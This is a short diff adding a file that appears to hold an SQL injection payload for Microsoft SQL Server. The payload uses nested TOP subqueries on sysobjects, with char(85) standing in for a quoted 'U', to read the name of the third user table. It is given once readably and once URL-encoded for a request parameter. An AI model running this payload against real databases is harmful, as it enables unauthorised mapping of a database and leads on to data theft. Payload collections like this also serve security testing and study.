@@ -1,0 +1,9 @@
+( 
+	select name from sysobjects where id=(
+		select top 1 id from (
+		   select top 3 id from sysobjects where xtype=char(85) order by id asc
+		   ) sq order by id desc
+		 )
+)
+
+(select+name+from+sysobjects+where+id=(select+top+1+id+from+(+select+top+3+id+from+sysobjects+where+xtype=char(85)+order+by+id+asc+)+sq+order+by+id+desc))
